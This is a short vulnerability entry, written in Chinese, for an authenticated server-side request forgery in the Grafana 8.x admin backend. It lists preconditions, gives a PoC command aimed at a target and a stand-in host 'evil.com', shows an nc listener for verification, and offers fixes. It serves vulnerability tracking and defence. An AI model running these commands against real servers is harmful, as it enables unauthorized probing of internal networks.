---
id: GRAFANA-ADMIN-SSRF
title: Grafana 管理后台SSRF漏洞
product: grafana
vendor: Grafana Labs
version_affected: "8.x"
severity: HIGH
tags: [ssrf, 需要认证]
fingerprint: ["Grafana"]
---

## 漏洞描述

Grafana 管理后台存在 SSRF 漏洞。已认证管理员可以向任意地址发送 HTTP 请求，并支持自定义 HTTP Header。

## 影响版本

- Grafana 8.x

## 前置条件

- 需要管理员权限（或匿名用户启用了 admin 角色）
- 需要能够访问管理后台

## 利用步骤

1. 登录 Grafana 管理后台
2. 使用 POC 脚本发送恶意请求

## Payload

```bash
# 使用 grafana-ssrf.py 脚本
python grafana-ssrf.py -H http://target:3000 -u http://evil.com/attack

# 或者手动利用
# 访问 Data Sources -> Add data source -> 填写目标 URL
```

## 验证方法

```bash
# 设置监听确认请求来源
nc -lvvp 8080
# 在 Grafana 中触发 SSRF 请求到你的监听端口
```

## 修复建议

1. 升级 Grafana 至最新版本
2. 禁用管理后台的外部请求功能
3. 对 URL 参数进行严格校验
